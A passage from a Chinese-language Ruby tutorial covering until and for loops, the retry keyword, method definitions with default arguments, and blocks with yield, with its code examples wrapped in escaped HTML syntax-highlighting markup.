class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;4. &lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;5. &lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4&lt;/span&gt;untile:语法1:1. &lt;span class=&quot;pln&quot;&gt;until conditional &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; code&lt;/span&gt;3. &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;1. &lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;3. &lt;span class=&quot;pln&quot;&gt;$i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;4. &lt;span class=&quot;pln&quot;&gt;$num &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;5. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;6. &lt;span class=&quot;pln&quot;&gt;until $i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; $num&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;do&lt;/span&gt;7. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Inside the loop i = #$i&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;8. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; $i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;;&lt;/span&gt;9. &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;这将产生以下结果：1. &lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;2. &lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;3. &lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;4. &lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;5. &lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4&lt;/span&gt;6. &lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;语法2：1. &lt;span class=&quot;pln&quot;&gt;code until conditional&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;3. &lt;span class=&quot;pln&quot;&gt;OR&lt;/span&gt;4. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;5. &lt;span class=&quot;pln&quot;&gt;begin&lt;/span&gt;6. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; code&lt;/span&gt;7. &lt;span class=&quot;pln&quot;&gt;end until conditional&lt;/span&gt;1. &lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;3. &lt;span class=&quot;pln&quot;&gt;$i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;4. &lt;span class=&quot;pln&quot;&gt;$num &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;5. &lt;span class=&quot;pln&quot;&gt;begin&lt;/span&gt;6. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Inside the loop i = #$i&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt;7. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; $i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;;&lt;/span&gt;8. &lt;span class=&quot;pln&quot;&gt;end until $i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; $num&lt;/span&gt;这将产生以下结果：1. &lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;2. &lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;3. &lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;4. &lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;5. &lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4&lt;/span&gt;6. &lt;span class=&quot;typ&quot;&gt;Inside&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; the loop i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;for语句：1. &lt;span class=&quot;kwd&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; variable &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; variable &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;...]&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; in expression &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; code&lt;/span&gt;3. &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;1. &lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;3. &lt;span class=&quot;kwd&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; i in &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0.&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;4. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Value of local variable is #{i}&quot;&lt;/span&gt;5. &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;这里我们定义的范围 0 .. 5 。因为在语句 for i in 0..5 将允许取值的范围从0到5（含5），这将产生以下结果：1. &lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;2. &lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;3. &lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;4. &lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;5. &lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4&lt;/span&gt;6. &lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt; for…in 循环几乎是完全等同于：1. &lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;expression&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;each &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;variable&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; variable&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;...]|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; code end&lt;/span&gt;除了一个for循环不创建一个新的局部变量的范围。一个循环的表情从代码分离，保留字，一个换行符，或分号。例子:1. &lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;3. &lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0.&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;each &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;|&lt;/span&gt;4. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Value of local variable is #{i}&quot;&lt;/span&gt;5. &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;这将产生以下结果：1. &lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;2. &lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;3. &lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;4. &lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;5. &lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4&lt;/span&gt;6. &lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;关键字：break：跳出循环next：进去下一次循环redo：重新循环此次迭代（不检查此次循环条件）retry语句：如果 retry 表达出现在 rescue 子句，则从开始重新开始。1. &lt;span class=&quot;pln&quot;&gt;begin&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; do_something &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# exception raised&lt;/span&gt;3. &lt;span class=&quot;pln&quot;&gt;rescue&lt;/span&gt;4. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# handles error&lt;/span&gt;5. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; retry&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# restart from beginning&lt;/span&gt;6. &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;如果出现重试迭代，块，或体内的表达，重新启动迭代调用。迭代器的参数条件将重新计算。1. &lt;span class=&quot;kwd&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; i in &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1.&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; retry &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; some_condition &lt;/span&gt;&lt;span class=&quot;com&quot;&gt;# restart from i == 1&lt;/span&gt;3. &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;1. &lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;3. &lt;span class=&quot;kwd&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; i in &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1.&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;5&lt;/span&gt;4. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; retry &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;&amp;nbsp; i &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;5. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Value of local variable is #{i}&quot;&lt;/span&gt;6. &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;这将产生以下结果，将进入无限循环：&nbsp;1. &lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;2. &lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;3. &lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;4. &lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;5. &lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;6. &lt;span class=&quot;typ&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; of local variable is &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;7. &lt;span class=&quot;pun&quot;&gt;............................&lt;/span&gt; 8.函数 &lt;span class=&quot;pln&quot;&gt;def method_name &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;arg &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]]...[,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;#42&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; arg &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;expr &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]])]&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; expr&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;..&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;所以，可以定义一个简单的方法如下： &lt;span class=&quot;pln&quot;&gt;def method_name &lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; expr&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;..&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;可以表示方法，接受这样的参数： &lt;span class=&quot;pln&quot;&gt;def method_name &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;var1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; var2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; expr&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;..&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;可以设置默认值，如果不传递所需的参数调用方法的参数将用于： &lt;span class=&quot;pln&quot;&gt;def method_name &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;var1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;value1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; var2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;value2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; expr&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;..&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;无论何时调用方法很简单，只需写方法的名称如下： &lt;span class=&quot;pln&quot;&gt;method_name&lt;/span&gt;然而，当调用一个方法带有参数，编写方法的名称以及参数，如： &lt;span class=&quot;pln&quot;&gt;method_name &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;30&lt;/span&gt;使用带参数的方法的最重要缺陷是，每当调用这些方法需要记住的参数个数。例如，如果一个方法接受三个参数传递只有两个，那么Ruby的将显示一条错误。 &lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;def test&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Ruby&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; a2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Perl&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;The programming language is #{a1}&quot;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;The programming language is #{a2}&quot;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;test &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;C&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;C++&quot;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;test&lt;/span&gt;这将产生以下结果：&nbsp; &lt;span class=&quot;typ&quot;&gt;The&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; programming language is C&lt;/span&gt; &lt;span class=&quot;typ&quot;&gt;The&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; programming language is C&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;typ&quot;&gt;The&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; programming language is &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Ruby&lt;/span&gt; &lt;span class=&quot;typ&quot;&gt;The&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; programming language is &lt;/span&gt;&lt;span class=&quot;typ&quot;&gt;Perl&lt;/span&gt; &lt;span class=&quot;kwd&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;OR&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt; &lt;span class=&quot;kwd&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;12&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;OR&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt; &lt;span class=&quot;kwd&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt; 9.块1. &lt;span class=&quot;pln&quot;&gt;block_name&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; statement1&lt;/span&gt;3. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; statement2&lt;/span&gt;4. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;..........&lt;/span&gt;5. &lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;yield 语句:让我们来看看在yield语句的一个例子：1. &lt;span class=&quot;com&quot;&gt;#!/usr/bin/ruby&lt;/span&gt;2. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&lt;/span&gt;3. &lt;span class=&quot;pln&quot;&gt;def test&lt;/span&gt;4. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;You are in the method&quot;&lt;/span&gt;5. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; yield&lt;/span&gt;6. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;You are again back to the method&quot;&lt;/span&gt;7. &lt;span class=&quot;pln&quot;&gt;&amp;nbsp;&amp;nbsp; yield&lt;/span&gt;8. &lt;span class=&quot;pln&quot;&gt;end&lt;/span&gt;9. &lt;span class=&quot;pln&quot;&gt;test &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;puts &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;You are in the block&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;}&lt;/span&gt;这将产生以下结果：1. &lt;span class=&quot;typ&quot;&gt;You&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; are in the method&lt;/span&gt;2. &lt;span class=&quot;typ&quot;&gt;You&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; are in the block&lt;/span&gt;3. &lt;span class=&quot;typ&quot;&gt;You&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; are again back to the method&lt;/span&gt;4. 